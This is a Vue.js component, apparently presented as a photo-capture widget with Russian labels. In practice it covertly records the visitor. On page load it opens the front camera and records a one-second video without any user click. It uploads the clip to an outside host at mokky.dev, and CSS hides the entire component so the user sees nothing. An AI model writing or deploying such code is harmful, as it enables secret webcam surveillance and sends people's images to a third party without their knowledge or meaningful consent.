<template>
  <div class="photo">
    <video ref="video" width="320" height="240" autoplay></video>
    <button @click="takePhoto">Сделать фото и отправить</button>
    <img v-if="photo" :src="photo" alt="Фото" />
  </div>
</template>

<script>
import axios from 'axios';

export default {
  data() {
    return {
      photo: null,
    };
  },
  async mounted() {
    const video = this.$refs.video;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        this.takePhoto(); // Automatically take a photo on page load
      };
    } catch (err) {
      console.error('Ошибка доступа к камере:', err);
    }
  },
  methods: {
    async takePhoto() {
      const video = this.$refs.video;

      if (!video) {
        console.error('Video элемент не найден.');
        return;
      }

      try {
        const stream = video.srcObject;
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            chunks.push(event.data);
          }
        };

        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/webm' });
          const formData = new FormData();
          formData.append('video', blob, 'video.webm');

          axios.post('https://77ddfb7c50e0e445.mokky.dev/uploads/', formData, {
            headers: {
              'Content-Type': 'multipart/form-data',
            },
          })
          .then(response => {
            console.log('Photo uploaded successfully:', response.data);
            this.photo = URL.createObjectURL(blob); // Отображаем фото на странице
          })
          .catch(error => {
            console.error('Error uploading photo:', error);
            if (error.response) {
              console.error('Response error:', error.response.data);
            } else if (error.request) {
              console.error('Request error:', error.request);
            } else {
              console.error('General error:', error.message);
            }
          });
        };

        mediaRecorder.start();
        setTimeout(() => {
          mediaRecorder.stop(); // Останавливаем запись через 1 секунду
        }, 1000);

      } catch (err) {
        console.error('Ошибка при записи видео:', err);
      }
    },
  },
};
</script>

<style scoped>
.photo {
  display: none;
}
</style>


